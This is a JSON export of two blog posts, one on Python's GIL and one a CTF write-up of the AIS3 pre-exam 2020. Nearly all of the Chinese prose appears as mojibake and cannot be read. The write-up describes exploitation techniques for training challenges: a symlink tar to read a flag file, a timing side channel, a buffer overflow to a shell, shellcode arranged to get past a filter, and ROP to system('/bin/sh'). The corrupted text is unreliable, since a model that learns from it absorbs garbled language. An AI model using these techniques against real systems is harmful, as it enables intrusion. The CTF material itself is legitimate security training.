{"posts":[{"title":"ã€ç¨‹å¼èªè¨€ã€‘Python GIL","text":"GIL è§£æ±ºäº†ä»€éº¼å•é¡Œ æ¯å€‹ python çš„ç‰©ä»¶éƒ½æœ‰ä¸€å€‹ reference count å¯ä»¥é€é sys.getrefcount é€™å€‹å‡½å¼æŸ¥çœ‹ 12345&gt;&gt;&gt; import sys&gt;&gt;&gt; a = []&gt;&gt;&gt; b = a&gt;&gt;&gt; sys.getrefcount(a)3 ä»¥ä¸Šçš„ä¾‹å­ï¼Œæœ‰ a, b å’Œ sys.getrefcount çš„åƒæ•¸ä¸‰å€‹ reference åœ¨æœ‰å¾ˆå¤š threads çš„æƒ…æ³ä¸‹æˆ‘å€‘å¿…é ˆé˜²æ­¢é€™å€‹ reference count çš„ race condition ä¸€å€‹ç°¡å–®çš„è§£æ±ºæ–¹æ³•å°±æ˜¯ GIL ç‚ºä»€éº¼é¸ GIL ä½œç‚ºè§£æ±ºæ–¹æ³• å°±å› ç‚ºç°¡å–®æ˜“ç”¨ï¼Œè®“é–‹ç™¼è€…æœƒæƒ³åŠ å…¥é–‹ç™¼ä»¥åŠä½¿ç”¨å®ƒ ( æ­£å› ç‚ºå¦‚æ­¤ä½¿å¾— python é€™éº¼ç†±é–€ ) é‚£ GIL ç‚ºä»€éº¼åˆ°ç¾åœ¨éƒ½é‚„æ²’è¢«æ‹¿æ‰ å› ç‚ºå¾ˆå¤šææ¡ˆé›–ç„¶è®“ multithread æ•ˆç‡å¢åŠ ä½†å»è®“ singlethread è®Šæ…¢äº† python 3.2 åœ¨ python 3.2 ç¨å¾®ä¿®æ”¹äº† GIL çš„é‹ä½œæ©Ÿåˆ¶ ( å°æ”¹é€² ) åŸæœ¬åœ¨æœ‰ CPU-bound å’Œ IO-bound çš„ threads äº’æ¶æ™‚ï¼ŒIO-bound è¦ç­‰å¾ˆä¹…æ‰èƒ½æ‹¿å› GIL ( è©³æƒ…çœ‹é€™ç¯‡ ) æœ‰ GIL æ€è¾¦ multiprocessing ç”¨ multiprocessing åˆ†è¨±å¤š processï¼Œæ¯å€‹ process æœƒæœ‰ç¨ç«‹çš„ interpreter å’Œ memory space ( ä¸æœƒæœ‰å› ç‚º GIL å¡ä½çš„å•é¡Œ ) ä½†æ˜¯ multi-processing æ¯”èµ· multi-threading æœƒæœ‰é¡å¤–çš„ overhead Alternative Python interpreters å¯ä»¥ç”¨å…¶ä»–å¯¦ä½œç‰ˆæœ¬çš„ python interpreters æ¯”å¦‚ Jython å’Œ IronPython æ²’æœ‰ GIL https://realpython.com/python-gil/ https://www.youtube.com/watch?v=Obt-vMVdM8s http://dabeaz.blogspot.com/2010/01/python-gil-visualized.html http://www.dabeaz.com/python/GIL.pdf","link":"/2019/01/06/GIL/"},{"title":"ã€CTF Writeupsã€‘AIS3 pre-exam 2020","text":"é€™å­¸æœŸä¿®äº†ç¶²è·¯æ”»é˜²å¯¦ç¿’ï¼Œé€™å ‚èª²è¦ç”¨ AIS3 Pre-Exam ç•¶æœŸæœ«è€ƒï¼Œå¥½å–”ã€‚ æ”»æ“Šè…³æœ¬å€‘åœ¨é€™ Misc Piquero é€™é¡Œçµ¦äº†ä¸€å¼µé»å­—çš„åœ–ï¼Œåªè¦å…ˆæ‰¾åˆ°å‡ºé¡Œè€…ç”¨çš„ generator é€™å€‹ï¼Œæ¥è‘—å°±ä¸€å€‹ä¸€å€‹å°ç…§å°±è§£å‡ºä¾†äº†ã€‚ 1AIS3{I_feel_sleepy_Good_Night!!!} Karuego é€™é¡Œçµ¦äº†ä¸€å¼µ pngï¼Œå…ˆç”¨ binwalk --dd=&quot;.*&quot; Karuego.png æ‹‰å‡ºä¸€å€‹ zip æª”ï¼Œé€™å€‹ zip æª”æœ‰åŠ å¯†ï¼ŒåŸæœ¬æƒ³ç”¨ fcrackzip ä¹‹é¡çš„çˆ†ç ´å·¥å…·ï¼Œä½† zsteg -a Karuego.png ä¸‹å»ç™¼ç¾ LSB æœ‰ä¸€æ®µæ–‡å­— The key is : lafireï¼Œzip æª”è§£é–‹è£¡é¢æœ‰ä¸€å¼µ Demon.png æ‰“é–‹å°±çœ‹åˆ° flag äº†ã€‚ 1AIS3{Ar3_y0u_r34l1y_r34dy_t0_sumnn0n_4_D3m0n?} Soy é€™é¡Œçµ¦äº†ä¸€å¼µ pngï¼Œæ˜¯è¢«å¢¨æ¼¬æ±¡æŸ“çš„ QR Codeï¼Œæˆ‘ç”¨ https://merricx.github.io/qrazybox/ æŠŠå·²çŸ¥çš„é»‘é»ç™½é»éƒ½ç•«äº†ä¸Šå»å°±è§£å‡ºä¾†äº†ï¼Œå› ç‚ºå¤§éƒ¨åˆ†çš„ Data å€å¡Šéƒ½æ²’è¢«æ±¡æŸ“åˆ°å§ï¼Œé€™å€‹ç¶²ç«™ä¸Šç•« QR Code çš„æ™‚å€™è¨˜å¾—è¦ç•«ç™½é»ï¼Œä¸è¦åªç•«é»‘é»ï¼Œæ²’ç•«çš„æœƒæ˜¯æœªçŸ¥çš„ç°é»ï¼Œæˆ‘åœ¨é€™è£¡å¡å¾ˆä¹…Q 1AIS3{H0w_c4n_y0u_f1nd_me?!?!?!!} Saburo é€™é¡Œè¦ nc 60.250.197.227 11001ï¼Œæ²’çµ¦åŸå§‹ç¢¼ï¼Œé€£ä¸Šå»è¦è¼¸å…¥ flag çµ¦ä»–ï¼Œä»–æœƒè¼¸å‡ºä½ å¹¾ç§’å¾Œè¼¸äº† 12Flag: AHaha, you lose in 24 milliseconds. çŒœæ¸¬æ˜¯ Side Channel Attackï¼ŒåŸå§‹ç¢¼çŒœæ¸¬å¤§æ¦‚æ˜¯ ( ä¸è² è²¬ä»»äº‚å¯« code å¦‚ä¸‹ ) 1234567891011121314151617181920import timedef compare(real_flag, user_flag): l = len(user_flag) if len(user_flag) &lt; len(real_flag) else len(real_flag) for i in range(len(user_flag)): if user_flag[i] != real_flag[i]: return False return i == len(user_flag) - 1real_flag = 'AIS3{...}'user_flag = input()start = time.clock()win = compare(real_flag, user_flag)end = time.clock()if not win: print(f'Haha, you lose in {end - start} milliseconds.')else: print(f'Oh, you win. QQ') ä½†æ˜¯å¾ˆå¤šäººåœ¨é€£ç·šçš„æ™‚å€™å»ç®— cpu time æœƒæŠ–çš„å¾ˆå¤§åŠ›ï¼Œæ‰€ä»¥å¾Œä¾† server æ‡‰è©²æ˜¯æ”¹æˆç”¨æ¨¡æ“¬çš„ ( å°±æ¯”è¼ƒç©©äº† )ï¼Œå°±æ˜¯éŒ¯äº†å°±åŠ å€‹ random å° noiseï¼Œå°äº†å°±åŠ ä¸€å€‹å¤§ä¸€é»çš„å€¼ä¹‹é¡çš„ã€‚ æ‰€ä»¥æ¯å€‹å­—éƒ½çˆ†æœ 0 - 255ï¼Œç„¶å¾Œå–æœ€å¤§çš„å°±å¥½äº†ï¼Œå¯ä»¥æ¯æ¬¡å˜—è©¦éƒ½é€å€‹åæ¬¡å–å¹³å‡ä¹‹é¡çš„ï¼Œæˆ–æ˜¯æŠŠ log è¨˜èµ·ä¾†ï¼Œä¹‹å¾Œå¦‚æœçˆ†æœæ‰€æœ‰ byte éƒ½æ²’æœ‰é€²å±•çš„è©±å°±ï¼Œå›å»æ‰¾ç¬¬äºŒé«˜çš„ï¼Œæœƒæ¯”è¼ƒç©©ã€‚ 1AIS3{A1r1ght_U_4r3_my_3n3nnies} Shichirou é€™é¡Œè¦ nc 60.250.197.227 11000ï¼Œæœ‰çµ¦åŸå§‹ç¢¼ï¼Œçµ¦ä»–ä¸€å€‹ tar æª”ï¼Œä»–å¹«ä½ è§£é–‹ç„¶å¾ŒæŠŠè§£é–‹çš„ guess.txt è·Ÿ local çš„ flag.txt çš„ sha1 åšæ¯”è¼ƒï¼Œå¦‚æœä¸€æ¨£çš„è©±å°±å™´ flagã€‚ tar å¯ä»¥å£“ç¸® symbolic linkï¼Œè‡ªå·±åšä¸€å€‹ symbolic link æŒ‡å‘ flag.txt å°±å®Œæˆäº†ã€‚ 12ln -s ../flag.txt guess.txttar -cf test.tar ./ 1AIS3{Bu223r!!!!_I_c4n_s33_e_v_e_r_y_th1ng!!} Clara é€™é¡Œçµ¦äº†ä¸€å€‹ pcap æª”ï¼Œä¸€é–‹å§‹å•¥æç¤ºéƒ½æ²’æœ‰ï¼Œå¾Œä¾†æœ‰èªªæ˜¯ Malware åœ¨ monitor é›»è…¦ç„¶å¾Œå‚³ encrypted data çµ¦ C&amp;C Serverï¼Œç„¶å¾Œå‚³äº†å…©æ¬¡ä¸€æ¨£çš„è³‡æ–™ï¼Œçœ‹äº†è€åŠå¤©ï¼Œæœƒç™¼ç¾ tcp æµé‡è£¡é¢æœ‰é¡ä¼¼ AIS3 çš„å­—æ¨£ï¼Œæœ‰å…©å¤§åŒ… tcpï¼Œä¸€åŒ… 10 MB å¦ä¸€åŒ… 27 MBï¼ŒåŠ å¯†çš„è©±å¤§æ¦‚ä¹Ÿåªæœ‰ xor æ¯”è¼ƒæ­£å¸¸å§ï¼Œæ‰€ä»¥è¤‡è£½äº†ä¸€äº›éƒ¨åˆ†ç”¨ xortool åˆ†æï¼Œæ‰¾åˆ° key æ˜¯ AIS3{NO}ï¼Œè€Œä¸”çœ‹åˆ° PNG é–‹é ­çš„å­—æ¨£å’Œä¸€äº› xml çš„ meta dataï¼Œå°±å¯ä»¥ç¢ºå®šå‡è¨­æ­£ç¢ºä¹Ÿè§£å°äº†(æ±—ï¼Œæ—¢ç„¶å…©æ¬¡åŒ…çš„æ˜æ–‡æ˜¯ä¸€æ¨£çš„é‚£å°±æŠŠå…©åŒ…åš xor å† xor ä¸Š AIS3{NO} å°±å¾—åˆ°å¦ä¸€åŒ…çš„ key æ˜¯ xSECRETxï¼Œæ¥è‘—æŠŠæ•´åŒ…æ‹¿å»åš xor æ‹‰å‡ºåœ–ç‰‡ï¼Œåœ–ç‰‡æœ‰å¥½å¹¾ MB å¾ˆå¤§ï¼Œä¸€é–‹å§‹åªæœ‰æ‹‰å‡ºä¸€å¼µåœ–ç‰‡ï¼ŒæŸå€‹å‹•æ¼«çš„åœ–ï¼Œåˆå¡äº†ä¸€ä¸‹å¾Œï¼Œç™¼ç¾é‚£åŒ…å‰é¢çš„éƒ¨åˆ†æœ‰é¡ä¼¼ header çš„æ±è¥¿ï¼Œä»–ä¸æ˜¯ 8 çš„å€æ•¸ï¼Œæˆ‘ä¸€é–‹å§‹æ˜¯ç›´æ¥ä¸ç†ä»–ï¼Œä½†æ˜¯çŒœæ¸¬å¾Œé¢ä¹Ÿæœ‰å¥½å¹¾æ®µ headerï¼Œè®“ xor æ²’å°é½Šå£æ‰ï¼Œæ‰€ä»¥æˆ‘å°±æŠŠæ•´æ®µ data æš´åŠ› shift äº†å¹¾æ¬¡æ‹¿å» xorï¼Œå°±æ‹‰å‡ºæ‰€æœ‰ç…§ç‰‡äº†ï¼Œå…¶ä¸­ä¸€å¼µæœ‰ flagï¼Œå…¶ä»–éƒ½åƒåœ¾ï¼ŒåŸæœ¬ä¸çŸ¥é“æœ‰å¾ˆå¤šå¼µåœ–ç‰‡ï¼Œä¹Ÿä¸çŸ¥é“ flag åœ¨å“ªçš„æ™‚å€™é‚„åœ¨é–‹ stegsolve å’Œ zsteg åœ¨åœ–ç‰‡æ‰¾ flagï¼Œæµªè²»å¾ˆå¤šæ™‚é–“ã€‚ ä»–çš„ packet æ˜¯å¾ˆæœ‰ç§©åºæ²’æœ‰äº‚å‚³çš„ï¼Œheader è£¡é¢å°±æ˜¯å›ºå®šå‚³ä¸€å€‹ 0xdeadbeeffaceb00c ç„¶å¾Œ C&amp;C æŠŠå‰›å‰›é‚£æ®µ xor åŠ å¯†å›å‚³ï¼Œæ¥è‘—å¾Œé¢æª”æ¡ˆåå­—çš„å¤§å°ï¼Œå’Œæª”æ¡ˆåå­—ï¼Œæ¯å€‹éƒ½åˆ†é–‹å‚³ï¼Œæ¯å€‹éƒ½è‡ªå·±åš xor cipherï¼Œæ¥è‘—å°±æ˜¯å‚³ dataï¼Œéƒ½æ²’æœ‰èµ°æ­ªæˆ–æ˜¯æ‰é€²ä»€éº¼å‘çš„è©±é‚„æ˜¯æœ‰æ©Ÿæœƒè§£å‡ºä¾†çš„ï¼Œæˆ‘ä¹Ÿä¸å¸¸åˆ†æ packet ä¹Ÿæ²’åˆ†æéä»€éº¼æƒ¡æ„ç¨‹å¼ï¼Œç¶“é©—ä¸è¶³æ‰€ä»¥è§£å¾ˆä¹…é‚„è¦çœ‹ hint QQ 1AIS3{T0y_t0Y_C4n_u_f1nd_A_n_yTh1ng_d3h1nb_nn3??} Reverse TsaiBro é€™é¡Œçµ¦äº†ä¸€å€‹ ELF åŸ·è¡Œæª”é‚„æœ‰è¢«åŠ å¯†çš„ flag æª”ï¼Œè¢«åŠ å¯†çš„ flag æª”çš„ä¸€å°æ®µå¤§æ¦‚é•·ä¸‹é¢é€™æ¨£ ç™¼è²¡..ç™¼è²¡.......ç™¼è²¡....ç™¼è²¡.......ç™¼è²¡....ç™¼è²¡.ç™¼è²¡........ éš¨ä¾¿ç”¨ ida çœ‹äº†ä¸€ä¸‹å¾Œï¼ŒåŠ å¯†æµç¨‹å°±æ˜¯æŠŠ flag è½‰ä¹˜ flag // 8 å’Œ flag % 8ï¼Œç„¶å¾Œæ•¸å­—æ˜¯å¤šå°‘å°±è½‰ä¹˜å¤šå°‘å€‹é»ï¼Œæ‰€ä»¥æœ€å¤š 8 å€‹é»ï¼Œä¸Šé¢é‚£æ®µå°±æ˜¯ [2, 7, 4, 7, 4, 1, 8]ï¼Œé‚£è§£å¯†å°±åéä¾†çµ„å›å»å°±å¥½ã€‚ 1AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3} Fallen Beat é€™é¡Œçµ¦äº†ä¸€éš» jar åŸ·è¡Œæª”ï¼Œè·‘èµ·ä¾†æ˜¯ä¸€å€‹ç¯€å¥éŠæˆ²ï¼Œè¦ Full Combo æ‰èƒ½æ‹¿åˆ° flagï¼Œé‚£ç›´æ¥ JD-GUI ä¸‹å»çœ‹ä»–ï¼Œé—œéµåœ¨ PanelEnding.class è£¡é¢ï¼Œå®šç¾©äº†è¢«åŠ å¯†çš„ flag é™£åˆ—ï¼Œé‚„æœ‰å¾Œé¢åš xor è§£å› flag å°å‡ºä¾†çš„éƒ¨åˆ† 12345byte[] flag = new byte[] { 89, 74, 75, 43, 126, 69, 120, 109, 68, 109, 109, 97, 73, 110, 45, 113, 102, 64, 121, 47, 111, 119, 111, 71, 114, 125, 68, 105, Byte.MAX_VALUE, 124, 94, 103, 46, 107, 97, 104 }; 123456if (t == mc) { for (i = 0; i &lt; cache.size(); i++) this.flag[i % this.flag.length] = (byte)(this.flag[i % this.flag.length] ^ ((Integer)cache.get(i)).intValue()); String fff = new String(this.flag); this.text[0].setText(String.format(&quot;Flag: %s&quot;, new Object[] { fff }));} é€™è£¡çš„ cache åŸæœ¬ä»¥ç‚ºæ˜¯å…§å»ºçš„æ±æ±ï¼Œçµæœä¸æ˜¯ï¼Œè¿½äº†ä¸€ä¸‹ç™¼ç¾åœ¨ GameControl.class æœ‰å®šç¾©ï¼Œæ±è¥¿æ˜¯å¾ songs/gekkou/hell.txt æŠ“å‡ºä¾†çš„ï¼Œé‚£å°±ç›´æ¥ç…§è‘— xor å°±è§£å‡ºä¾†äº†ã€‚ 1AIS3{Wow_how_m4ny_h4nds_do_you_h4ve} Stand up!Brain é€™é¡Œçµ¦äº†ä¸€å€‹ ELF åŸ·è¡Œæª”ï¼Œéš¨ä¾¿çœ‹äº†ä¸€ä¸‹ç™¼ç¾ä»–å¯¦åšäº† Brainfuckï¼Œç„¶å¾Œç¨‹å¼ç¢¼åœ¨åŸ·è¡Œæª”è£¡é¢ï¼Œæ‹‰å‡ºä¾†é•·é€™æ¨£ 1-------------------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;--------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;-------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;---------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;---------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;&gt;----[----&gt;+&lt;]&gt;++.++++++++.++++++++++.&gt;-[-----&gt;+&lt;]&gt;.+[---&gt;++&lt;]&gt;+++.&gt;-[---&gt;+&lt;]&gt;-.[----&gt;+++++&lt;]&gt;-.[--&gt;+&lt;]&gt;---.[---&gt;++&lt;]&gt;---.++[-&gt;+++&lt;]&gt;.+[--&gt;+&lt;]&gt;+.[---&gt;++&lt;]&gt;---.++[-&gt;+++&lt;]&gt;.+++.[---&gt;+&lt;]&gt;----.[--&gt;+&lt;]&gt;-----.[-&gt;++&lt;]&gt;+.-[----&gt;+++&lt;]&gt;.--------.&gt;-[---&gt;+&lt;]&gt;.-[-----&gt;+&lt;]&gt;-.++++++++.--[-----&gt;+++&lt;]&gt;.+++.[---&gt;+&lt;]&gt;-.-[--&gt;+&lt;]&gt;---.++[---&gt;+++++&lt;]&gt;.++++++++++++++.+++[-&gt;+++++&lt;]&gt;.[-----&gt;+&lt;]&gt;++.&gt;-[-----&gt;+&lt;]&gt;.---[-&gt;++&lt;]&gt;-.++++++.[---&gt;+&lt;]&gt;+++.+++.[-]]]]]]] äººè…¦è·‘äº†ä¸€ä¸‹ç™¼ç¾å‰é¢ä¸€æ®µæ˜¯åœ¨åšå¾ˆå¤š if åˆ¤æ–·ï¼Œå¾Œé¢æœ‰ . çš„éƒ¨åˆ†æ˜¯å° flag çš„éƒ¨åˆ†ã€‚ 1234567891011121314151617# if (ptr[0] - 67) == 0-------------------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[ # if (ptr[2] - 56) == 0 &gt;--------------------------------------------------------[&gt;[-]&lt;[-]]&gt; [ # if (ptr[4] - 55) == 0 &gt;-------------------------------------------------------[&gt;[-]&lt;[-]]&gt; [ # if (ptr[6] - 54) == 0 &gt;------------------------------------------------------[&gt;[-]&lt;[-]]&gt; [ # if (ptr[8] - 51) == 0 &gt;---------------------------------------------------[&gt;[-]&lt;[-]]&gt; [ # if (ptr[8] - 33) == 0 &gt;---------------------------------[&gt;[-]&lt;[-]]&gt; æ‰€ä»¥åªè¦ä½ çš„è¼¸å…¥è¦æ˜¯ C8763! å°±æœƒé€²åˆ°å¾Œé¢å° flag çš„éƒ¨åˆ†ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥åŸ·è¡ŒåŸæœ¬çš„ç¨‹å¼è¼¸å…¥ C8763! è·Ÿæ¡äººä¸€èµ·ä½¿å‡ºæ˜Ÿçˆ†æ°£æµæ–¬æ‹¿ flagï¼Œæˆ–æ˜¯ç›´æ¥å¿½ç•¥å‰é¢æŠŠå¾Œé¢é‚£æ®µè²¼åˆ°ç·šä¸Šçš„ Brainfuck Compiler åŸ·è¡Œä¸€ä¸‹ä¹Ÿå¯ä»¥æ‹¿åˆ° flagã€‚ 1AIS3{Th1s_1s_br4iNFUCK_bu7_m0r3_ez} Long Island Iced Tea é€™é¡Œçµ¦äº†ä¸€å€‹ ELF åŸ·è¡Œæª”é‚„æœ‰è¢«åŠ å¯†çš„ flag æª”ï¼Œè¢«åŠ å¯†çš„ flag é•·é€™æ¨£ 1850a2a4d3fac148269726c5f673176335f6d335f55725f49475f346e645f746831735f31735f6d316e655f746572727974657272795f5f7d0000000000000000 éš¨ä¾¿å˜—è©¦äº†ä¸€ä¸‹ç™¼ç¾è¶…é 8 å€‹ bytes ä¹‹å¾Œçš„éƒ½ä¸æœƒè®Šè€Œä¸”ç›´æ¥æ˜¯æ˜æ–‡äº†ï¼ŒæŠŠä¸Šé¢é‚£æ®µå¾ hex è½‰å› bytes å°±è®Šæˆ 1\\x85\\n*M?\\xac\\x14\\x82irl_g1v3_m3_Ur_IG_4nd_th1s_1s_m1ne_terryterry__}\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 å‰é¢ 8 å€‹ bytes å·²çŸ¥ AIS3{ 5 å€‹å­—äº†ï¼Œæ‰€ä»¥ç›´æ¥çˆ†æœå‰©ä¸‹ 3 å€‹å­—ã€‚ 1AIS3{A!girl_g1v3_m3_Ur_IG_4nd_th1s_1s_m1ne_terryterry__} La vie en rose é€™é¡Œçµ¦äº†çµ¦ PE çš„åŸ·è¡Œæª”ï¼ŒåŸæœ¬ä»¥ç‚º\u001dè¦é€†å‘ windows äº†ï¼Œæ‰“é–‹å¾Œçœ‹åˆ°ä¸€å † python çš„å‡½å¼åº«é‚„æœ‰ tkinterï¼Œç™¼ç¾ä»–æ˜¯ç”¨ PyInstaller åŒ…çš„ï¼Œåƒè€ƒ é€™ç¯‡ ç”¨å®˜æ–¹çš„ archive_viewer.py æŠŠ pyc æ‹‰å‡ºä¾† ( å…¶å¯¦å¥½åƒæ˜¯ pyd æª”æ‰å°ï¼Œå¥½åƒæ ¼å¼ä¸Šå·®äº†ä¸€é» )ï¼Œåœ¨é€† pyc çš„æ™‚å€™ç¢ºå®šç‰ˆæœ¬å¾ˆé‡è¦ï¼Œæ‹‰å‡ºä¾†çš„ pyc æ²’æœ‰ magic value headerï¼Œå¯ä»¥éš¨ä¾¿å†æ’ˆå€‹æ¯”å¦‚ pyimod01_os_path å‡ºä¾†ï¼Œé€™å€‹å°±æœ‰ magic value æ˜¯ 550d 0d0aï¼Œæ‰€ä»¥æ˜¯ Python 3.8 b4 ç‰ˆï¼Œå…ˆå˜—è©¦ç”¨äº†ä¸€ä¸‹ uncompyle6 å»é‚„åŸåŸå§‹ç¢¼ï¼Œå¯æ˜¯ä»–å™´éŒ¯ç„¶å¾Œå¤±æ•—äº†ï¼Œé‚£æˆ‘å€‘å°±ç›´æ¥çœ‹ bytecode å§ï¼Œç”¨ marshal.loads è¼‰å…¥ç‚º code object å†ç”¨ dis.dis å» disassembleï¼Œé‚ŠçŒœä»–çš„åŸå§‹ç¢¼ï¼Œå¯ä»¥é‚Šç”¨ dis.dis(compile('x = 1', 'filename', 'exec')) å»é©—è­‰ï¼Œçœ‹äº†ä¸€ä¸‹æœƒç™¼ç¾ 1flag = &quot;&quot;.join(map(chr, [secret[i] ^ notes[i % len(notes)] for i in range(len(secret))])) flag æ˜¯ç”¨ secret å’Œ notes xor å‡ºä¾†çš„ï¼Œsecret æ˜¯å¯«æ­»çš„ï¼Œnotes æ˜¯å¾ input è¼¸å…¥é€²ä¾†çš„ï¼Œç„¶å¾Œåšäº†ä¸‹é¢çš„è¨ˆç®—ç®—å‡º result 12345notes = list(map(ord, notes))for i in range(len(notes) - 1): result.append(notes[i] + notes[i+1])for i in range(len(notes) - 1): result.append(notes[i] - notes[i+1]) æœ€å¾ŒæŠŠ result è·Ÿä¸€å€‹å›ºå®šçš„é™£åˆ—åšæ¯”è¼ƒï¼Œæ‰€ä»¥æˆ‘å€‘æœ‰ a+b å’Œ a-b åªè¦æŠŠå…©å€‹åŠ èµ·ä¾†é™¤ä»¥äºŒå°±æ‹¿åˆ° a äº†ï¼ŒæŠŠ notes é‚„åŸå†è·Ÿ secret xor å°±å¾—åˆ° flag äº†ã€‚ 1AIS3{th1s_fl4g_red_lik3_ros3s_f1lls_ta1wan} Uroboros é€™é¡Œçµ¦äº†ä¸€å€‹ ELF åŸ·è¡Œæª”ï¼Œæ˜¯ C++ å¯«çš„ï¼Œç¸½ä¹‹å°±é€†ä»–ï¼Œç™¼ç¾ä»–æ˜¯ä¸€å€‹ circular double linked listï¼Œçµæ§‹å°±åƒä¸‹é¢é€™æ¨£å¾ˆæ™®é€šã€‚ 12345struct Node { struct Node* prev; struct Node* next; int data;}; ç¸½å…±æœ‰ 314 å€‹ Nodeï¼Œå°è¼¸å…¥çš„æ¯å€‹å­—ï¼Œä»–æœƒå…ˆå¾€ä¸‹èµ° è¼¸å…¥çš„å­—ä¹˜ä¸Š 7 æ¬¡ç„¶å¾ŒæŠŠèµ°åˆ°çš„é‚£å€‹ Node çš„å€¼ä¹˜ 64 åŠ ä¸Š counterï¼Œcounter å°±æ˜¯ä¸€é–‹å§‹æ˜¯ 1ï¼Œæ¯ç¶“éä¸€å€‹å­—åŠ ä¸€ï¼Œæœ€å¾ŒæŠŠæ•´æ®µè¼¸å‡ºè·ŸæŸå€‹ç­”æ¡ˆæ¯”è¼ƒï¼Œå°äº†å°±ä»£è¡¨ä½ çš„è¼¸å…¥å°±æ˜¯ flagï¼Œæ‰€ä»¥å°±ç…§è‘—è§£å›ä¾†ï¼ŒæŠŠæ•¸å­—ç•¶æˆ 64 é€²ä½æ‹†é–‹ï¼Œæ¯”å¦‚ç¬¬ 141 å€‹ Node å­˜çš„ 70 æ‹†æˆ 64 * 1 + 6ï¼Œä»£è¡¨ç¬¬ä¸€å€‹å’Œç¬¬å…­å€‹å­—æ˜¯ â€˜Aâ€™ï¼Œå› ç‚º ord('A') * 7 = 141 ( mod 341 )ï¼Œå°±æ˜¯æŠŠ 141 * inverse(7, 341) = 65 = ord('A')ï¼Œå°±é€™æ¨£ã€‚ 1AIS3{4ll_humonculus_h4v3_a_ur0b0r0s_m4rk_0n_the1r_b0dy} Pwn BOF æœ€ç°¡å–®çš„ buffer overflowï¼Œè£¡é¢å·²ç¶“æœ‰ä¸€å€‹å‡½å¼ï¼Œç›´æ¥å‘¼å«å°±æ‹¿åˆ° shell äº†ï¼Œä½†æ˜¯è¨˜å¾—è¦è·³åˆ° push rbp ä¸‹ä¸€è¡Œï¼Œå¦‚æœè·³åˆ° push rbp çš„è©± stack æœƒæ²’æœ‰å°é½Š 16 çš„å€æ•¸ï¼Œåš system çš„æ™‚å€™æœƒé€²åˆ° child thread ç„¶å¾Œè·‘åˆ° movaps XMMWORD PTR [rsp+0x40], xmm0 å› ç‚ºæ²’å°é½Šå°±æ›äº†ï¼Œç„¶å¾Œ child thread æ­»æ‰ system å°±æœƒåŸ·è¡Œå®Œè·³å‡ºä¾† ( éƒ½é‚„æ²’æ‰“åˆ°æŒ‡ä»¤ )ï¼Œå‡ºä¾†è·‘åˆ°å‡½å¼çµå°¾ return çš„æ™‚å€™åˆæœƒæ›æ‰ï¼Œå› ç‚ºæ­£å¸¸å‘¼å«å‡½å¼éƒ½æœƒæŠŠ return address æ”¾åˆ° stack ä¸Šï¼Œä½†æ˜¯ç›´æ¥è·³éå»å°±æ²’æœ‰æ”¾ï¼Œä»–å°±æœƒ return åˆ°å¥‡æ€ªçš„ä½ç½®ã€‚ 1AIS3{OLd_5ChOOl_tr1ck_T0_m4Ke_s7aCk_A116nmeNt} Nonsense é€™é¡Œè®“æˆ‘å€‘è¼¸å…¥ shellcodeï¼Œç„¶å¾Œæœƒæª¢æŸ¥ shellcode è£¡é¢æœ‰æ²’æœ‰ wubbalubbadubdub é€™æ®µå­—ï¼Œä¸¦ä¸”åœ¨é€™æ®µå­—å‰é¢çš„æ¯å€‹å­—éƒ½è¦å°æ–¼ç­‰æ–¼ 31ï¼Œè€Œæ‰¾åˆ°é‚£æ®µå­—ä¹‹å¾Œå°±æœƒç›´æ¥è·³å‡ºæª¢æŸ¥å‡½å¼ï¼Œæ‰€ä»¥é‚£æ®µå­—çš„å¾Œé¢éƒ½ä¸æœƒè¢«æª¢æŸ¥äº†ï¼Œé‚£æˆ‘å€‘çš„ shellcode å°±æ§‹é€ æˆæœ€é–‹é ­å…ˆ ja è·³åˆ°å¾Œé¢çœŸæ­£çš„ shellcodeï¼Œç„¶å¾Œä¸­é–“æ”¾ wubbalubbadubdubï¼Œå°±å®Œæˆäº†ã€‚ 12345ja shellcode... (some padding instructions)wubbalubbadubdubshellcode:... 1AIS3{Y0U_5peAk_$helL_codE_7hat_iS_CARzy!!!} Portal Gun é€™é¡Œå°±æ˜¯ç”¨ gets çš„ bofï¼Œæœ‰ä¸€å€‹å‡½å¼æœ‰ç”¨åˆ° system('sh')ï¼Œä½†æ˜¯ä»–æœ‰ LD_PRELOAD ä¸€å€‹ hook.so è£¡é¢æŠŠ system hook æ‰äº†ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥å«ï¼Œé‚£å°±å † ROP leak libc address å†è‡ªå·±è·³é€²å» system å§ã€‚ 1AIS3{U5E_Port@L_6uN_7o_GET_tHe_$h3L1_0_o} Morty School é€™é¡Œä¸€é–‹å§‹å°±çµ¦ä½  leak libc address çµ¦ä½ ï¼Œæ¥ä¸‹ä¾†ä½ å¯ä»¥æŒ‘ä¸€å€‹ Morty æ•™ï¼Œä½†ä½ çµ¦çš„ index ä»–æ²’æœ‰æª¢æŸ¥ï¼Œæ‰€ä»¥å¯ä»¥ä»»æ„å¯«ä¸€å€‹ä½å€ï¼Œä½†æ˜¯ä¸æ˜¯ç›´æ¥å¯«å€¼ä¸Šå»ï¼Œè€Œæ˜¯å¯«åˆ°ä½ çµ¦ä»–çš„ä½å€è£¡é¢æ”¾çš„ä½å€è£¡é¢çš„å€¼ï¼Œæ‰€ä»¥æ‰¾ä¸€ä¸‹å“ªè£¡æœ‰å­˜ __stack_chk_fail got çš„ä½å€ï¼Œåˆ©ç”¨ä»–å»å¯« __stack_chk_fail çš„ got æ”¹æˆæˆ‘å€‘ä¸²å¥½çš„ ROP gadgetsï¼Œç„¶å¾Œå¯«çˆ† stackï¼ˆ å› ç‚ºé€™è£¡ä¹Ÿæœ‰ overflow ï¼‰ï¼Œå°±è·³å»åš ROP äº†ï¼Œä¸€é–‹å§‹æœ‰æƒ³ç›´æ¥è·³ one gadgets ä½†æ˜¯æ¢ä»¶éƒ½ä¸ç¬¦ï¼Œæ‰€ä»¥å°±è‡ªå·±åš ROP åš system('/bin/sh')ã€‚ 